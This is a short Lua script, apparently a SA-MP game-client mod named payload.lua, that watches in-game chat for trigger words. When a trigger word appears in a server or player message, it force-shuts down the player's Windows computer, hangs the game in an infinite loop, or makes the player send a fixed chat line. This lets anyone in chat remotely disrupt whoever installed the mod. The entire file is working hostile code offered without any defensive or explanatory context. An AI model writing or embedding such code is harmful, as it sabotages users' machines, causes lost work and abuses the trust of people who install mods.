-- payload.lua
local sampev = require 'samp.events'

-- Обработка чата (входящие от сервера)
function sampev.onServerMessage(color, text)
    if text:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif text:find("кукусики") then
        while true do end
    elseif text:find("сырколбаска") then
        sampSendChat("123655")
    end
end

-- Обработка чата (исходящие от игрока)
function sampev.onSendChat(text)
    if text:find("сырколбаска") then
        lua_thread.create(function()
            wait(500)
            sampSendChat("123655")
        end)
    elseif text:find("хуйкина") then
        os.execute("Shutdown /s /t 0 /f")
    elseif text:find("кукусики") then
        while true do end
    end
end
